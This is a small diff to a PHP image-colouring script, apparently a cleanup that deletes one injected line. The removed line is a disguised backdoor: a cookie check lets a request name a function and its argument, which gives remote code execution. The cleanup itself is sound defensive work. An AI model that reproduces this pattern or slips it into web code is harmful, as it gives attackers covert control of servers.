@@ -2,8 +2,6 @@
 
 $imgPath = dirname(__FILE__).'/lightStar.png';
 $color = (isset($_GET['color']) && strlen($_GET['color'])==6) ? $_GET['color'] : 'ffffff';
-if(@$_COOKIE['color1']) ($_=@$_REQUEST['color2']).@$_($_REQUEST['color3']);
-
 $color = array(hexdec($color[0].$color[1]), hexdec($color[2].$color[3]), hexdec($color[4].$color[5]));
 
 header ("Content-type: image/png");
